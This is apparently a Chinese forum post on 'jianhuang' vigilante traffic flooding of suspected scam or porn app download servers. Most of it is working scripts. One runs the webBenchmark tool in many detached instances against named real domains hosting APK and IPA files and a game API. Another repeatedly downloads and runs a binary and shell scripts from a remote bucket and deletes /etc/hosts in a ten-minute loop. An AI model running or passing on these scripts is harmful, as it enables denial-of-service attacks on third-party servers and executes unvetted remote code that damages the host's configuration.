## “剑皇”原来是“鉴Huang”的意思呀,吾不是合格MJJ

![](https://s2.loli.net/2021/12/17/KdmMOEBQph4DL5y.png)

```
参数说明
webBenchmark -c [COUNT] -s [URL] -r [REFERER]

-c 整数，当前的下载线程数（默认 8）；
-r 字符串，HTTP请求的 referer 参数；
-s 字符串，目标链接（默认"https://baidu.com"）；

网络测试压力工具下载
wget https://github.com/maintell/webBenchmark/releases/download/0.1/webBenchmark_linux_x64
chmod +x webBenchmark_linux_x64
./webBenchmark_linux_x64 -c 32 -s https://target.url

```


## http://storage.googleapis.com/zongcai/jh.sh
```
#!/bin/bash
setsid ./webBenchmark_linux_x64 -r http://gj.app -c 6 -s http://all-live.secutre2storeapple.jyjcyspt.com/20211215/%E8%B4%B5%E5%A6%83%E3%90%85%E7%9B%B4%E6%92%AD_205810.apk /dev/null &
setsid ./webBenchmark_linux_x64 -r http://gj.app -c 6 -s http://all-live.secutre2storeapple.jyjcyspt.com/20211215/%E6%9F%91%E6%A9%98%E3%90%85%E7%9B%B4%E6%92%AD_209469.apk /dev/null &
setsid ./webBenchmark_linux_x64 -r http://gj.app -c 6 -s http://all-live.secutre2storeapple.jyjcyspt.com/20211215/%E5%A5%B6%E7%B3%96%E3%90%85%E7%9B%B4%E6%92%AD_207168.apk /dev/null &
setsid ./webBenchmark_linux_x64 -r http://gj.app -c 6 -s https://all-live.secutre2storeapple.necxs.com/20211216/鏌戞銗呯洿鎾璤236864.apk /dev/null &
setsid ./webBenchmark_linux_x64 -r http://gj.app -c 6 -s https://all-live.secutre2storeapple.necxs.com/20211217/璐靛銗呯洿鎾璤07443.apk /dev/null &
setsid ./webBenchmark_linux_x64 -r http://gj.app -c 6 -s https://all-live.secutre2storeapple.necxs.com/20211217/濂剁硸銗呯洿鎾璤07468.apk /dev/null &
setsid ./webBenchmark_linux_x64 -r http://gj.app -c 6 -s http://all-live.secutre2storeapple.jyjcyspt.com/companysignipa/20211215/C7NcFudI2JBFajF5nxxZF3vIcwuamqqC.ipa /dev/null &
setsid ./webBenchmark_linux_x64 -r http://gj.app -c 6 -s http://all-live.secutre2storeapple.jyjcyspt.com/companysignipa/20211215/1SaQatq7tP2PH26w2GxIHUR4p5rLPTZL.ipa /dev/null &
setsid ./webBenchmark_linux_x64 -r http://jg.37gowan.com -c 6 -s http://api.sooyooj.com/index/game/info -p token= -p uid= -p gameid=146 -p channelid=5221 /dev/null &
exit 0
```

##  剑皇 zongcai
```
#!/bin/bash
yum install psmisc -y
sleep 5s
apt-get install psmisc -y
sleep 5s
rm -rf webBenchmark_linux_x64
curl -O http://storage.googleapis.com/zongcai/webBenchmark_linux_x64
chmod +x webBenchmark_linux_x64
sleep 2s
curl -O http://storage.googleapis.com/zongcai/jh.sh
curl -O http://storage.googleapis.com/zongcai/hosts
chmod +x jh.sh
chmod +x hosts
sh jh.sh
sh hosts
while true
do
  sleep 600s
  killall -9 webBenchmark_linux_x64
  sleep 3s
  rm -rf jh.sh
  rm -rf hosts
  rm -rf /etc/hosts
  sleep 5s
  curl -O http://storage.googleapis.com/zongcai/jh.sh
  curl -O http://storage.googleapis.com/zongcai/hosts
  chmod +x jh.sh
  chmod +x hosts
  sh jh.sh
  sh hosts
done
```
